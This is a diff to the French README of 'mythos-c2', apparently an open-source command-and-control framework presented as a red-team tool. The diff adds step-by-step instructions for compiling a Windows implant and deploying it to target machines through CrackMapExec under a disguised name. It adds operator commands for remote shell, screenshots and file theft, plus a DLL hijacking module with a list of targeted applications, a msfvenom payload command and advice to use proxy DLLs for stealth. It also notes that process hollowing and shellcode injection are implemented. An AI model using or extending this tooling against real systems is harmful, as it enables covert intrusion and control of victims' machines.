@@ -32,6 +32,10 @@
 │  │Transport │  │  Crypto  │  │Commands  │  │ Evasion  │   │
 │  │ Beacon   │  │ECDH+GCM  │  │ Shell/PS │  │Anti-sand │   │
 │  └──────────┘  └──────────┘  └──────────┘  └──────────┘   │
+│  ┌──────────────────────────────────────────────────────┐   │
+│  │                  Inject Module                        │   │
+│  │  DLL Hijacking │ Process Hollowing │ Shellcode Inj.  │   │
+│  └──────────────────────────────────────────────────────┘   │
 └─────────────────────────────────────────────────────────────┘
 ```
 
@@ -105,7 +109,7 @@ Agent                                    Serveur
 # Go 1.22+
 go version
 
-# Rust + cargo
+# Rust + cargo (avec toolchain MSVC pour Windows natif)
 rustup --version
 
 # Pour la cross-compilation Windows depuis Linux
@@ -113,47 +117,87 @@ rustup target add x86_64-pc-windows-gnu
 apt install gcc-mingw-w64-x86-64 -y
 ```
 
-### Compiler
+---
 
-```bash
-# Cloner le repo
-git clone https://github.com/redteamtogo/mythos-c2
-cd mythos-c2
+### 1. Compiler l'agent
 
-# Compiler avec l'URL du C2
-C2_URL=https://192.168.249.100:8080 bash scripts/build.sh windows
+#### Depuis Windows (recommandé — compilation native)
+
+```powershell
+cd mythos-c2/agent
+
+# Définir l'URL du C2 (IP de ton Kali / team server)
+$env:C2_URL = "http://192.168.X.X:8080"
+
+# Compiler en mode release (optimisé + strippé)
+cargo build --release
+
+# Le binaire est dans :
+# agent/target/release/agent.exe
 ```
 
-### Démarrer le team server
+#### Depuis Kali Linux (cross-compilation vers Windows)
 
 ```bash
-./dist/mythos-server \
+cd mythos-c2/agent
+
+# Ajouter la target Windows
+rustup target add x86_64-pc-windows-gnu
+
+# Compiler avec l'URL du C2
+C2_URL="http://192.168.X.X:8080" cargo build --release --target x86_64-pc-windows-gnu
+
+# Le binaire est dans :
+# agent/target/x86_64-pc-windows-gnu/release/agent.exe
+```
+
+---
+
+### 2. Démarrer le team server (Kali)
+
+```bash
+cd mythos-c2/server
+
+# Démarrer avec les options par défaut
+go run main.go
+
+# Ou avec options personnalisées
+go run main.go \
+  --listener-host 0.0.0.0 \
   --listener-port 8080 \
+  --api-host 127.0.0.1 \
   --api-port 8443 \
   --admin-pass "VotreMotDePasseSecurisé!"
+```
 
-# Vérifier que ça tourne
+Vérifier que ça tourne :
+```bash
 curl http://localhost:8443/api/ping
 # → {"status":"mythos"}
 ```
 
-### Déployer l'agent
+---
+
+### 3. Déployer l'agent (sur la cible Windows)
 
 ```bash
-# Sur la cible Windows (depuis Kali via CrackMapExec)
+# Depuis la cible directement (PowerShell)
+.\agent.exe
+
+# Ou via réseau (CrackMapExec depuis Kali)
 crackmapexec smb <TARGET_IP> -u user -p pass \
-  --put-file ./dist/mythos-agent.exe C:\\Windows\\Temp\\svc.exe
+  --put-file ./agent.exe C:\\Windows\\Temp\\svc.exe
 
 crackmapexec smb <TARGET_IP> -u user -p pass \
   -x "C:\\Windows\\Temp\\svc.exe"
 ```
 
-### 4. Utiliser la Console Opérateur (Nouveau !)
+---
 
-La manière la plus simple d'interagir avec le C2 est d'utiliser la console interactive intégrée.
+### 4. Console Opérateur
 
 ```bash
-# Ouvrir un NOUVEAU terminal, et lancer la console :
+# Depuis Kali, dans un nouveau terminal :
 cd mythos-c2/server
 go run cmd/console/main.go --api http://127.0.0.1:8443
 
@@ -162,16 +206,37 @@ go run cmd/console/main.go --api http://127.0.0.1:8443
 # Password : MythosAdmin2024!
 ```
 
-#### Commandes de base dans la console :
+#### Commandes disponibles dans la console :
+
 ```text
-mythos > agents             # Liste les agents connectés
-mythos > use <AGENT_ID>     # Sélectionne un agent
-mythos [ID] > shell whoami  # Envoie une commande asynchrone
-mythos [ID] > tasks         # Récupère le résultat
+# Navigation
+mythos > agents                   # Liste les agents connectés
+mythos > use <AGENT_ID>           # Sélectionne un agent (prefix OK)
+mythos > back                     # Désélectionner l'agent
+
+# Exécution de commandes
+mythos [ID] > shell whoami        # Commande shell
+mythos [ID] > powershell <script> # Script PowerShell
+mythos [ID] > tasks               # Voir les résultats des tâches
+mythos [ID] > proclist            # Liste des processus
+mythos [ID] > screenshot          # Capture d'écran
+
+# Transfert de fichiers
+mythos [ID] > upload <src> <dst>  # Uploader un fichier
+mythos [ID] > download <path>     # Télécharger un fichier
+
+# DLL Hijacking
+mythos [ID] > hijack_scan         # Scanner les opportunités de DLL hijacking
+mythos [ID] > hijack_deploy <dll> # Déployer une DLL malveillante (chemin local)
+
+# Agent control
+mythos [ID] > sleep <secondes>    # Modifier l'intervalle de beacon
+mythos [ID] > kill                # Terminer l'agent
 ```
 
-#### 🚀 Mode "Pseudo-Interactif"
-Pour une fluidité totale, vous pouvez basculer l'agent en mode interactif. Cela réduit le sleep à 1s et permet de naviguer naturellement.
+#### Mode "Pseudo-Interactif"
+
+Pour une fluidité totale, basculer l'agent en mode interactif (beacon toutes les 1s) :
 
 ```text
 mythos [ID] > interactive
@@ -189,9 +254,41 @@ mythos-shell [ID] > exit
 
 ---
 
-### 5. API Avancée (Pour l'automatisation)
+### 5. Module DLL Hijacking
 
-Vous pouvez toujours interagir avec le C2 via des requêtes HTTP brutes (curl, python, etc.).
+Le module de DLL Hijacking est entièrement implémenté dans l'agent Rust (`agent/src/inject/dll_hijack.rs`).
+
+#### Fonctionnement
+
+1. `hijack_scan` : L'agent cherche sur la cible des applications vulnérables (qui chargent des DLL manquantes dans des répertoires accessibles en écriture).
+2. `hijack_deploy <dll>` : Le C2 envoie une DLL compilée localement. L'agent la dépose au bon emplacement. Elle sera exécutée au prochain lancement de l'application cible.
+
+#### Applications ciblées (source : hijacklibs.net)
+
+| Application | DLL manquante |
+|---|---|
+| Microsoft Teams | version.dll |
+| Visual Studio Code | CRYPTSP.dll |
+| 7-Zip | UXTheme.dll |
+| Notepad++ | UxTheme.dll |
+| Wireshark | airpcap.dll |
+| calc.exe (lab) | VERSION.dll |
+
+#### Générer une DLL de test
+
+```bash
+# Depuis Kali — DLL de démonstration (ouvre calc.exe)
+msfvenom -p windows/x64/exec CMD="calc.exe" -f dll -o /tmp/payload.dll
+
+# Déployer via la console
+mythos [ID] > hijack_deploy /tmp/payload.dll
+```
+
+> **Note** : Pour un déploiement furtif, une **Proxy DLL** est recommandée (elle exporte toutes les fonctions légitimes de la vraie DLL tout en exécutant le payload). Le template de Proxy DLL est disponible via `generate_proxy_dll_template()` dans le code source.
+
+---
+
+### 6. API REST (Pour l'automatisation)
 
 ```bash
 # S'authentifier
@@ -200,11 +297,18 @@ TOKEN=$(curl -s -X POST http://localhost:8443/api/operators/login \
   -d '{"username":"admin","password":"MythosAdmin2024!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 
-# Envoyer une tâche
+# Envoyer une tâche shell
 curl -X POST \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"type":"shell","payload":"whoami /all"}' \
+  http://localhost:8443/api/agents/<AGENT_ID>/task
+
+# Scanner les opportunités DLL hijacking
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"type":"hijack_scan","payload":""}' \
   http://localhost:8443/api/agents/<AGENT_ID>/task
 ```
 
@@ -212,9 +316,13 @@ curl -X POST \
 
 ## Roadmap — Prochaines fonctionnalités
 
+- [x] Console interactive opérateur (CLI)
+- [x] Mode pseudo-interactif (shell persistant)
+- [x] DLL hijacking module (scan + deploy)
+- [x] Process hollowing
+- [x] Shellcode injection
+- [ ] Proxy DLL generator (génération automatique depuis le C2)
 - [ ] Direct syscalls (Hell's Gate) — bypass hooks ntdll
-- [ ] Process injection (svchost.exe)
-- [ ] DLL hijacking module
 - [ ] ETW patching
 - [ ] AMSI bypass
 - [ ] DNS tunneling listener
@@ -240,7 +348,7 @@ Toute utilisation sur des systèmes sans autorisation explicite est illégale.
 SHERKO — Pull requests bienvenues.
 
 Domaines où contribuer en priorité :
-- Module DLL hijacking (Rust/C)
+- Proxy DLL generator (Rust/C)
 - Listener DNS tunneling (Go)
 - Interface web opérateur (React)
 - Techniques de sleep obfuscation Windows
